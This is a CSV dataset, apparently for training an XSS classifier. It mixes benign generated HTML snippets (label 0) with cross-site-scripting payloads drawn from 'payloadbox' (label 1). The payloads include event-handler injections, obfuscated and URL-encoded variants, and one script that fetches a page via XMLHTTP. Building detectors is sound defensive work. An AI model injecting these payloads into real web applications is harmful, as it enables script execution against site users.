text,label,source,length,timestamp
"<abbr onkeydown=""alert(1)"" contenteditable>test</abbr>",1,payloadbox,54,2026-02-09T15:05:27.714766
"<div id=""90""><!-- Up to Opera 10.63 -->",1,payloadbox,39,2026-02-09T15:05:27.725769
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.737767
"<small onkeypress=""alert(1)"" contenteditable>test</small>",1,payloadbox,57,2026-02-09T15:05:27.720768
"<style>@keyframes x{}</style><progress style=""animation-name:x"" onanimationend=""alert(1)""></progress>",1,payloadbox,101,2026-02-09T15:05:27.722765
<bdi id=x tabindex=1 ondeactivate=alert(1)></bdi><input id=y autofocus>,1,payloadbox,71,2026-02-09T15:05:27.714766
<ol onfocusout=alert(1) tabindex=1 id=x></ol><input autofocus>,1,payloadbox,62,2026-02-09T15:05:27.719771
<span class='class-5864'>Services</span>,0,generated,40,2026-02-09T15:05:27.742765
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.729765
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.729765
<p>About</p>,0,generated,12,2026-02-09T15:05:27.729765
"<ins onmouseleave=""alert(1)"">test</ins>",1,payloadbox,39,2026-02-09T15:05:27.718768
<p>About</p>,0,generated,12,2026-02-09T15:05:27.726766
"<html onmouseover=""alert(1)"">test</html>",1,payloadbox,40,2026-02-09T15:05:27.717767
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.734777
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.732765
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.737767
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.744765
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.738766
<x onxxx=alert(1) 1=',1,payloadbox,21,2026-02-09T15:05:27.713767
"<style>@keyframes x{}</style><isindex style=""animation-name:x"" onanimationend=""alert(1)""></isindex>",1,payloadbox,99,2026-02-09T15:05:27.722765
"<style>:target {transform: rotate(180deg);}</style><wbr id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></wbr>",1,payloadbox,124,2026-02-09T15:05:27.721766
"<style>@keyframes x{}</style><section style=""animation-name:x"" onanimationstart=""alert(1)""></section>",1,payloadbox,101,2026-02-09T15:05:27.722765
<noscript id=x tabindex=1 ondeactivate=alert(1)></noscript><input id=y autofocus>,1,payloadbox,81,2026-02-09T15:05:27.719771
"<style>@keyframes x{}</style><blockquote style=""animation-name:x"" onanimationend=""alert(1)""></blockquote>",1,payloadbox,105,2026-02-09T15:05:27.722765
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.731765
"<kbd draggable=""true"" ondrag=""alert(1)"">test</kbd>",1,payloadbox,50,2026-02-09T15:05:27.718768
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.731765
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.733766
"<bgsound oncut=""alert(1)"" contenteditable>test</bgsound>",1,payloadbox,56,2026-02-09T15:05:27.715767
"<div onbeforepaste=""alert(1)"" contenteditable>test</div>",1,payloadbox,56,2026-02-09T15:05:27.716766
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.727768
<br id=x tabindex=1 onfocusin=alert(1)></br>,1,payloadbox,44,2026-02-09T15:05:27.715767
"<ol onbeforepaste=""alert(1)"" contenteditable>test</ol>",1,payloadbox,54,2026-02-09T15:05:27.719771
<D3/OnMouSEenTer=[2].find(confirm)>z,1,payloadbox,36,2026-02-09T15:05:27.724768
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.732765
"<ul draggable=""true"" ondrag=""alert(1)"">test</ul>",1,payloadbox,48,2026-02-09T15:05:27.723765
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.730765
<span class='class-4954'>Services</span>,0,generated,40,2026-02-09T15:05:27.739765
"<noscript onmouseout=""alert(1)"">test</noscript>",1,payloadbox,47,2026-02-09T15:05:27.719771
"<div draggable=""true"" contenteditable>drag me</div><bdi ondrop=alert(1) contenteditable>drop here</bdi>",1,payloadbox,103,2026-02-09T15:05:27.716766
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.733766
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.741766
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.731765
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.733766
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.739765
<basefont id=x tabindex=1 onbeforedeactivate=alert(1)></basefont><input autofocus>,1,payloadbox,82,2026-02-09T15:05:27.714766
<xmp id=x tabindex=1 onbeforeactivate=alert(1)></xmp>,1,payloadbox,53,2026-02-09T15:05:27.724768
"<base draggable=""true"" ondragenter=""alert(1)"">test</base>",1,payloadbox,57,2026-02-09T15:05:27.714766
<h2>Login</h2>,0,generated,14,2026-02-09T15:05:27.737767
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.727768
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.731765
<label id=x tabindex=1 onfocus=alert(1)></label>,1,payloadbox,48,2026-02-09T15:05:27.718768
<p>About</p>,0,generated,12,2026-02-09T15:05:27.737767
<p>About</p>,0,generated,12,2026-02-09T15:05:27.737767
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.726766
"<form oncut=""alert(1)"" contenteditable>test</form>",1,payloadbox,50,2026-02-09T15:05:27.717767
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.727768
"<colgroup draggable=""true"" ondrag=""alert(1)"">test</colgroup>",1,payloadbox,60,2026-02-09T15:05:27.715767
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.729765
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.737767
"<kbd onmouseleave=""alert(1)"">test</kbd>",1,payloadbox,39,2026-02-09T15:05:27.718768
<h4>Login</h4>,0,generated,14,2026-02-09T15:05:27.727768
<xss id=x tabindex=1 onfocusout=alert(1)></xss><input autofocus>,1,payloadbox,64,2026-02-09T15:05:27.724768
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.733766
<p>About</p>,0,generated,12,2026-02-09T15:05:27.728766
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.727768
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.739765
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.729765
<article id=x tabindex=1 ondeactivate=alert(1)></article><input id=y autofocus>,1,payloadbox,79,2026-02-09T15:05:27.714766
<svg><section onload=alert(1)></section>,1,payloadbox,40,2026-02-09T15:05:27.723765
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.726766
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.726766
<fieldset id=x tabindex=1 onfocus=alert(1)></fieldset>,1,payloadbox,54,2026-02-09T15:05:27.717767
"<menuitem onbeforepaste=""alert(1)"" contenteditable>test</menuitem>",1,payloadbox,66,2026-02-09T15:05:27.718768
<p>About</p>,0,generated,12,2026-02-09T15:05:27.737767
"<select oncopy=""alert(1)"" contenteditable>test</select>",1,payloadbox,55,2026-02-09T15:05:27.720768
<span class='class-6094'>Services</span>,0,generated,40,2026-02-09T15:05:27.742765
"<mark onkeyup=""alert(1)"" contenteditable>test</mark>",1,payloadbox,52,2026-02-09T15:05:27.718768
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.731765
"<style>:target {transform: rotate(180deg);}</style><frame id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></frame>",1,payloadbox,128,2026-02-09T15:05:27.721766
"<style>@keyframes slidein {}</style><rtc style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></rtc>",1,payloadbox,160,2026-02-09T15:05:27.722765
<h2>Login</h2>,0,generated,14,2026-02-09T15:05:27.731765
<span class='class-1364'>Services</span>,0,generated,40,2026-02-09T15:05:27.729765
"<acronym onbeforecopy=""alert(1)"" contenteditable>test</acronym>",1,payloadbox,63,2026-02-09T15:05:27.714766
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.741766
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.742765
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.730765
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.738766
<p>About</p>,0,generated,12,2026-02-09T15:05:27.729765
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.737767
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.738766
"<shadow onclick=""alert(1)"">test</shadow>",1,payloadbox,40,2026-02-09T15:05:27.720768
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.735774
"<strong onkeyup=""alert(1)"" contenteditable>test</strong>",1,payloadbox,56,2026-02-09T15:05:27.721766
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.735774
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.741766
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.735774
<span class='class-4464'>Services</span>,0,generated,40,2026-02-09T15:05:27.738766
<title onfocusout=alert(1) tabindex=1 id=x></title><input autofocus>,1,payloadbox,68,2026-02-09T15:05:27.723765
"<div id=""104""><svg xmlns=""http://www.w3.org/2000/svg"" id=""foo"">",1,payloadbox,63,2026-02-09T15:05:27.725769
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.731765
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.728766
<details id=x tabindex=1 onbeforedeactivate=alert(1)></details><input autofocus>,1,payloadbox,80,2026-02-09T15:05:27.716766
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.730765
"<strong oncontextmenu=""alert(1)"">test</strong>",1,payloadbox,46,2026-02-09T15:05:27.721766
"<td onmouseup=""alert(1)"">test</td>",1,payloadbox,34,2026-02-09T15:05:27.723765
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.727768
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.740766
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.733766
<span class='class-5534'>Services</span>,0,generated,40,2026-02-09T15:05:27.741766
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><audio id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></audio>",1,payloadbox,180,2026-02-09T15:05:27.722765
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.732765
"<mark oncontextmenu=""alert(1)"">test</mark>",1,payloadbox,42,2026-02-09T15:05:27.718768
<div id=x tabindex=1 onfocus=alert(1)></div>,1,payloadbox,44,2026-02-09T15:05:27.716766
<span class='class-954'>Services</span>,0,generated,39,2026-02-09T15:05:27.727768
<span class='class-1094'>Services</span>,0,generated,40,2026-02-09T15:05:27.728766
"<caption onmouseout=""alert(1)"">test</caption>",1,payloadbox,45,2026-02-09T15:05:27.715767
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.740766
"<html onbeforecopy=""alert(1)"" contenteditable>test</html>",1,payloadbox,57,2026-02-09T15:05:27.717767
"<option ondblclick=""alert(1)"">test</option>",1,payloadbox,43,2026-02-09T15:05:27.719771
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.727768
"<applet onkeyup=""alert(1)"" contenteditable>test</applet>",1,payloadbox,56,2026-02-09T15:05:27.714766
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.742765
"<spacer onmousedown=""alert(1)"">test</spacer>",1,payloadbox,44,2026-02-09T15:05:27.720768
<p>About</p>,0,generated,12,2026-02-09T15:05:27.737767
<h4>Login</h4>,0,generated,14,2026-02-09T15:05:27.728766
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.727768
<x oncut=alert(1)>copy this!,1,payloadbox,28,2026-02-09T15:05:27.713767
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.728766
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.734777
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.725769
"<ruby onmousedown=""alert(1)"">test</ruby>",1,payloadbox,40,2026-02-09T15:05:27.720768
"%3Cscript%3Exhr=new%20ActiveXObject%28%22Msxml2.XMLHTTP%22%29;xhr.open%28%22GET%22,%22/xssme2%22,true%29;xhr.onreadystatechange=function%28%29{if%28xhr.readyState==4%26%26xhr.status==200%29{alert%28xhr.responseText.match%28/%27%28[^%27]%2b%29/%29[1]%29}};xhr.send%28%29;%3C/script%3E",1,payloadbox,283,2026-02-09T15:05:27.724768
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.739765
"<div id=""100""><img[a][b]src=x[d]onerror[c]=[e]""alert(100)"">//[""'`-->]]>]</div><div id=""101""><a href=""[a]java[b]script[c]:alert(101)"">XXX</a>//[""'`-->]]>]</div><div id=""102""><img src=""x` `<script>alert(102)</script>""` `>//[""'`-->]]>]</div><div id=""103""><script>history.pushState(0,0,'/i/am/somewhere_else');</script>//[""'`-->]]>]</div>",1,payloadbox,334,2026-02-09T15:05:27.725769
"<noframes onmouseout=""alert(1)"">test</noframes>",1,payloadbox,47,2026-02-09T15:05:27.719771
<p>About</p>,0,generated,12,2026-02-09T15:05:27.726766
<span class='class-4624'>Services</span>,0,generated,40,2026-02-09T15:05:27.738766
"<style>:target {color: red;}</style><rp id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></rp>",1,payloadbox,107,2026-02-09T15:05:27.721766
<kbd id=x tabindex=1 ondeactivate=alert(1)></kbd><input id=y autofocus>,1,payloadbox,71,2026-02-09T15:05:27.718768
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.731765
<p>About</p>,0,generated,12,2026-02-09T15:05:27.734777
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.739765
"<dir oncontextmenu=""alert(1)"">test</dir>",1,payloadbox,40,2026-02-09T15:05:27.716766
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.743765
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.735774
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.736778
<svg><var onload=alert(1)></var>,1,payloadbox,32,2026-02-09T15:05:27.723765
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.733766
"<style>@keyframes x{}</style><tfoot style=""animation-name:x"" onanimationstart=""alert(1)""></tfoot>",1,payloadbox,97,2026-02-09T15:05:27.722765
"<blink onbeforepaste=""alert(1)"" contenteditable>test</blink>",1,payloadbox,60,2026-02-09T15:05:27.715767
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.741766
"<style>@keyframes slidein {}</style><iframe style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></iframe>",1,payloadbox,166,2026-02-09T15:05:27.721766
<svg><animatetransform onrepeat=alert(1) attributeName=transform repeatCount=2 dur=1s>,1,payloadbox,86,2026-02-09T15:05:27.722765
"<nobr draggable=""true"" ondragleave=""alert(1)"">test</nobr>",1,payloadbox,57,2026-02-09T15:05:27.719771
<p>About</p>,0,generated,12,2026-02-09T15:05:27.733766
"<menuitem onkeyup=""alert(1)"" contenteditable>test</menuitem>",1,payloadbox,60,2026-02-09T15:05:27.718768
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><frame id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></frame>",1,payloadbox,180,2026-02-09T15:05:27.722765
<fieldset onfocusout=alert(1) tabindex=1 id=x></fieldset><input autofocus>,1,payloadbox,74,2026-02-09T15:05:27.717767
<h2>Login</h2>,0,generated,14,2026-02-09T15:05:27.737767
<h2>Login</h2>,0,generated,14,2026-02-09T15:05:27.725769
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.732765
<figure onblur=alert(1) tabindex=1 id=x></figure><input autofocus>,1,payloadbox,66,2026-02-09T15:05:27.717767
<object id=x tabindex=1 ondeactivate=alert(1)></object><input id=y autofocus>,1,payloadbox,77,2026-02-09T15:05:27.719771
"<picture onkeyup=""alert(1)"" contenteditable>test</picture>",1,payloadbox,58,2026-02-09T15:05:27.719771
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.728766
<rp onfocusout=alert(1) tabindex=1 id=x></rp><input autofocus>,1,payloadbox,62,2026-02-09T15:05:27.720768
<base onblur=alert(1) tabindex=1 id=x></base><input autofocus>,1,payloadbox,62,2026-02-09T15:05:27.714766
"<textarea onkeydown=""alert(1)"" contenteditable>test</textarea>",1,payloadbox,62,2026-02-09T15:05:27.723765
<datalist onfocusout=alert(1) tabindex=1 id=x></datalist><input autofocus>,1,payloadbox,74,2026-02-09T15:05:27.715767
"<dir onkeydown=""alert(1)"" contenteditable>test</dir>",1,payloadbox,52,2026-02-09T15:05:27.716766
"<style>@keyframes x{}</style><aside style=""animation-name:x"" onanimationstart=""alert(1)""></aside>",1,payloadbox,97,2026-02-09T15:05:27.722765
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.726766
<span class='class-5284'>Services</span>,0,generated,40,2026-02-09T15:05:27.740766
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.729765
"<bgsound onkeypress=""alert(1)"" contenteditable>test</bgsound>",1,payloadbox,61,2026-02-09T15:05:27.715767
"<style>@keyframes slidein {}</style><em style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></em>",1,payloadbox,158,2026-02-09T15:05:27.721766
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.740766
"<frameset onkeyup=""alert(1)"" contenteditable>test</frameset>",1,payloadbox,60,2026-02-09T15:05:27.717767
<p>About</p>,0,generated,12,2026-02-09T15:05:27.732765
<span class='class-3504'>Services</span>,0,generated,40,2026-02-09T15:05:27.735774
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.726766
"<element draggable=""true"" ondragleave=""alert(1)"">test</element>",1,payloadbox,63,2026-02-09T15:05:27.716766
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.737767
"<span ondblclick=""alert(1)"">test</span>",1,payloadbox,39,2026-02-09T15:05:27.720768
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.742765
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.727768
"<div draggable=""true"" contenteditable>drag me</div><div ondragover=alert(1) contenteditable>drop here</div>",1,payloadbox,107,2026-02-09T15:05:27.716766
"<scRiPt y=""><"">/*<sCRipt* */prompt()</script",1,payloadbox,44,2026-02-09T15:05:27.724768
"<mark onkeypress=""alert(1)"" contenteditable>test</mark>",1,payloadbox,55,2026-02-09T15:05:27.718768
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.728766
"<blink oncontextmenu=""alert(1)"">test</blink>",1,payloadbox,44,2026-02-09T15:05:27.715767
"<style>:target {color:red;}</style><section id=x style=""transition:color 1s"" ontransitionend=alert(1)></section>",1,payloadbox,112,2026-02-09T15:05:27.721766
"<style>:target {color:red;}</style><nextid id=x style=""transition:color 1s"" ontransitionend=alert(1)></nextid>",1,payloadbox,110,2026-02-09T15:05:27.721766
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.735774
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.733766
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.725769
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.725769
<!-- Up to Opera 11.64 - see link below -->,1,payloadbox,43,2026-02-09T15:05:27.725769
<p>About</p>,0,generated,12,2026-02-09T15:05:27.736778
"<dir onbeforecut=""alert(1)"" contenteditable>test</dir>",1,payloadbox,54,2026-02-09T15:05:27.716766
"<script onclick=""alert(1)"">test</script>",1,payloadbox,40,2026-02-09T15:05:27.720768
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.743765
"<label draggable=""true"" ondragend=""alert(1)"">test</label>",1,payloadbox,57,2026-02-09T15:05:27.718768
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.742765
<tbody onblur=alert(1) tabindex=1 id=x></tbody><input autofocus>,1,payloadbox,64,2026-02-09T15:05:27.723765
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.740766
<tfoot id=x tabindex=1 onfocus=alert(1)></tfoot>,1,payloadbox,48,2026-02-09T15:05:27.723765
<tfoot id=x tabindex=1 onfocusin=alert(1)></tfoot>,1,payloadbox,50,2026-02-09T15:05:27.723765
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.728766
"<sub onbeforepaste=""alert(1)"" contenteditable>test</sub>",1,payloadbox,56,2026-02-09T15:05:27.722765
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.743765
"<html onclick=""alert(1)"">test</html>",1,payloadbox,36,2026-02-09T15:05:27.717767
"<style>@keyframes slidein {}</style><listing style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></listing>",1,payloadbox,168,2026-02-09T15:05:27.721766
<menu id=x tabindex=1 onbeforeactivate=alert(1)></menu>,1,payloadbox,55,2026-02-09T15:05:27.718768
<template id=x tabindex=1 onbeforedeactivate=alert(1)></template><input autofocus>,1,payloadbox,82,2026-02-09T15:05:27.723765
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.738766
<h6>Login</h6>,0,generated,14,2026-02-09T15:05:27.739765
<ul><li>Sign up</li></ul>,0,generated,25,2026-02-09T15:05:27.730765
"<font onkeydown=""alert(1)"" contenteditable>test</font>",1,payloadbox,54,2026-02-09T15:05:27.717767
"<u draggable=""true"" ondragleave=""alert(1)"">test</u>",1,payloadbox,51,2026-02-09T15:05:27.723765
"<rtc onmouseup=""alert(1)"">test</rtc>",1,payloadbox,36,2026-02-09T15:05:27.720768
"<style>:target {color:red;}</style><rtc id=x style=""transition:color 1s"" ontransitionend=alert(1)></rtc>",1,payloadbox,104,2026-02-09T15:05:27.721766
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.731765
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.729765
<span class='class-994'>Services</span>,0,generated,39,2026-02-09T15:05:27.728766
<h2>Login</h2>,0,generated,14,2026-02-09T15:05:27.738766
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.738766
"<menu draggable=""true"" ondragenter=""alert(1)"">test</menu>",1,payloadbox,57,2026-02-09T15:05:27.718768
<span class='class-5344'>Services</span>,0,generated,40,2026-02-09T15:05:27.740766
<p>About</p>,0,generated,12,2026-02-09T15:05:27.743765
"<style>@keyframes slidein {}</style><noembed style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></noembed>",1,payloadbox,168,2026-02-09T15:05:27.721766
"<hr onmousemove=""alert(1)"">test</hr>",1,payloadbox,36,2026-02-09T15:05:27.717767
<span class='class-1184'>Services</span>,0,generated,40,2026-02-09T15:05:27.728766
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.742765
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.725769
"<style>:target {color:red;}</style><dir id=x style=""transition:color 1s"" ontransitionend=alert(1)></dir>",1,payloadbox,104,2026-02-09T15:05:27.721766
"<style>@keyframes x{}</style><label style=""animation-name:x"" onanimationend=""alert(1)""></label>",1,payloadbox,95,2026-02-09T15:05:27.722765
<span class='class-6244'>Services</span>,0,generated,40,2026-02-09T15:05:27.743765
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.725769
<svg><b onload=alert(1)></b>,1,payloadbox,28,2026-02-09T15:05:27.722765
"<code onmouseover=""alert(1)"">test</code>",1,payloadbox,40,2026-02-09T15:05:27.715767
"<spacer draggable=""true"" ondragend=""alert(1)"">test</spacer>",1,payloadbox,59,2026-02-09T15:05:27.720768
"<style>@keyframes x{}</style><track style=""animation-name:x"" onanimationstart=""alert(1)""></track>",1,payloadbox,97,2026-02-09T15:05:27.722765
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.737767
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.743765
<element onfocusout=alert(1) tabindex=1 id=x></element><input autofocus>,1,payloadbox,72,2026-02-09T15:05:27.716766
"<nobr onmouseleave=""alert(1)"">test</nobr>",1,payloadbox,41,2026-02-09T15:05:27.719771
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.739765
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.726766
"<base oncut=""alert(1)"" contenteditable>test</base>",1,payloadbox,50,2026-02-09T15:05:27.714766
<p>About</p>,0,generated,12,2026-02-09T15:05:27.728766
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.736778
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.727768
"<map onmousemove=""alert(1)"">test</map>",1,payloadbox,38,2026-02-09T15:05:27.718768
"<form oncontextmenu=""alert(1)"">test</form>",1,payloadbox,42,2026-02-09T15:05:27.717767
<slot id=x tabindex=1 ondeactivate=alert(1)></slot><input id=y autofocus>,1,payloadbox,73,2026-02-09T15:05:27.720768
<div>Home</div>,0,generated,15,2026-02-09T15:05:27.735774
"<marquee draggable=""true"" ondrag=""alert(1)"">test</marquee>",1,payloadbox,58,2026-02-09T15:05:27.718768
"<article onmouseup=""alert(1)"">test</article>",1,payloadbox,44,2026-02-09T15:05:27.714766
<canvas id=x tabindex=1 ondeactivate=alert(1)></canvas><input id=y autofocus>,1,payloadbox,77,2026-02-09T15:05:27.715767
<p>About</p>,0,generated,12,2026-02-09T15:05:27.730765
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.728766
<h6>Login</h6>,0,generated,14,2026-02-09T15:05:27.731765
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.727768
"<label onclick=""alert(1)"">test</label>",1,payloadbox,38,2026-02-09T15:05:27.718768
"<param onmousedown=""alert(1)"">test</param>",1,payloadbox,42,2026-02-09T15:05:27.719771
<h4>Login</h4>,0,generated,14,2026-02-09T15:05:27.740766
"<video onbeforepaste=""alert(1)"" contenteditable>test</video>",1,payloadbox,60,2026-02-09T15:05:27.724768
"<div draggable=""true"" contenteditable>drag me</div><menuitem ondrop=alert(1) contenteditable>drop here</menuitem>",1,payloadbox,113,2026-02-09T15:05:27.716766
<p>About</p>,0,generated,12,2026-02-09T15:05:27.736778
<span class='class-5104'>Services</span>,0,generated,40,2026-02-09T15:05:27.740766
"<area oncut=""alert(1)"" contenteditable>test</area>",1,payloadbox,50,2026-02-09T15:05:27.714766
<form id=x tabindex=1 onfocus=alert(1)></form>,1,payloadbox,46,2026-02-09T15:05:27.717767
"<style>@keyframes x{}</style><figcaption style=""animation-name:x"" onanimationend=""alert(1)""></figcaption>",1,payloadbox,105,2026-02-09T15:05:27.722765
<img src='image.jpg' alt='image'>,0,generated,33,2026-02-09T15:05:27.737767
"<button draggable=""true"" ondragenter=""alert(1)"">test</button>",1,payloadbox,61,2026-02-09T15:05:27.715767
<a href='/page'>Contact</a>,0,generated,27,2026-02-09T15:05:27.727768
"<ins onkeypress=""alert(1)"" contenteditable>test</ins>",1,payloadbox,53,2026-02-09T15:05:27.718768
<button>Read more</button>,0,generated,26,2026-02-09T15:05:27.741766
<form action='/submit'><input type='text'></form>,0,generated,49,2026-02-09T15:05:27.738766
<input type='text' name='field'>,0,generated,32,2026-02-09T15:05:27.728766
<svg%0Aonload=%09((pro\u006dpt))()//,1,payloadbox,36,2026-02-09T15:05:27.724768
